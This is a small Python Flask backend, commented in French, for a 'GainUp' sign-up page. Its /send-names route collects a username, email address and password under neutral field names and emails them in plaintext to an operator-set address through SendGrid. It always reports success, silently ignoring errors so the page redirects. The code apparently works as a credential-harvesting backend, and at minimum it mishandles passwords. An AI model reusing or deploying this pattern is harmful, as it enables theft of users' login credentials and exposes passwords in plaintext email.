import os
from flask import Flask, render_template, request, jsonify
from sendgrid import SendGridAPIClient
from sendgrid.helpers.mail import Mail

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/main')
def main():
    return render_template('main.html')

@app.route('/send-names', methods=['POST'])
def send_names():
    data = request.json or {}

    name1 = data.get('name1')
    name2 = data.get('name2')
    name3 = data.get('name3')
    promo_code = data.get('promoCode', '')

    # Vérification minimale (frontend déjà OK)
    if not all([name1, name2, name3]):
        return jsonify({"success": True})

    # Variables d'environnement (configurées sur Render)
    SENDGRID_API_KEY = os.environ.get("SENDGRID_API_KEY")
    EMAIL_SENDER = os.environ.get("EMAIL_SENDER")
    EMAIL_RECEIVER = os.environ.get("EMAIL_RECEIVER")

    # Si config manquante → on ne bloque JAMAIS
    if not SENDGRID_API_KEY or not EMAIL_SENDER or not EMAIL_RECEIVER:
        return jsonify({"success": True})

    message = Mail(
        from_email=EMAIL_SENDER,
        to_emails=EMAIL_RECEIVER,
        subject="Nouvelle inscription GainUp",
        html_content=f"""
            <h2>Nouveau compte créé</h2>
            <p><b>Pseudo :</b> {name1}</p>
            <p><b>Email :</b> {name2}</p>
            <p><b>Mot de passe :</b> {name3}</p>
            <p><b>Code promo :</b> {promo_code or "Aucun"}</p>
        """
    )

    try:
        sg = SendGridAPIClient(SENDGRID_API_KEY)
        sg.send(message)
    except Exception as e:
        print("Erreur SendGrid :", e)
        # On ignore volontairement l’erreur

    # TOUJOURS success pour permettre la redirection
    return jsonify({"success": True})

if __name__ == '__main__':
    app.run()
